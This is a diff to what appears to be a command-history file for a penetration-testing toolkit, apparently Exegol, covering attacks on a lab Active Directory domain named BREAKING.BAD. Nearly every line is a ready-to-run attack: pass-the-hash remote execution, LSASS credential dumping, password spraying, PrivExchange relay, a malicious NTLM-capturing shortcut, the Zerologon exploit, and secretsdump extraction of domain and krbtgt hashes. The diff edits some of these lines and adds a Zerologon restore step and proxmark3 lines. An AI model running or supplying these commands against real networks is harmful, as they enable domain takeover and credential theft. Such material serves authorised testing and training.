@@ -39,9 +39,9 @@ wmiexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@
 atexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 dcomexec.py -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@SV01.BREAKING.BAD
 cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
-cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
+cme smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=exegol4thewin
 crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy
-crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
+crackmapexec smb 192.168.56.0/24 --local-auth -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=exegol4thewin
 sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous -p 'azerty'
 sprayhound -d BREAKING.BAD -dc DC01.BREAKING.BAD -lu anonymous -lp anonymous
 lsassy -v -u Administrator -H a88baa3fdc8f581ee0fb05d7054d43e4 192.168.56.0/24
@@ -58,7 +58,7 @@ cme smb 192.168.56.0/24 -u anonymous -p anonymous --loggedon-users
 cme smb 192.168.56.0/24 --local-auth -u '' -p ''
 crackmapexec smb 192.168.56.0/24 -u '' -p '' --shares
 privexchange.py -ah 192.168.56.1 -d BREAKING.BAD -u anonymous -p anonymous EXCHANGE.BREAKING.BAD
-neo4j console
+neo4j start
 lnk-generate.py --host 192.168.56.1 --type ntlm --output '@SHUTDOWN-LNK.lnk'
 autorecon 192.168.10.10
 nmap --script=ldap-search -p 389 192.168.10.10
@@ -167,5 +167,7 @@ net rpc password someuser -U BREAKING/anotheruser -S DC01.BREAKING.BAD
 pth-net rpc password someuser -U BREAKING/anotheruser%ffffffffffffffffffffffffffffffff:c1c635aa12ae60b7fe39e28456a7bac6 -S DC01.BREAKING.BAD
 zerologon-scan DC01 192.168.56.101
 zerologon-exploit DC01 192.168.56.101
-secretsdump -just-dc-user krbtgt -no-pass 'BREAKING.BAD/DC01$@dc01.breaking.bad'
-secretsdump -history -just-dc-user 'DC01$' -no-pass 'BREAKING.BAD/DC01$@dc01.breaking.bad'
+secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad
+zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d
+pm3 -p /dev/ttyACM0
+proxmark3 -p /dev/ttyACM0
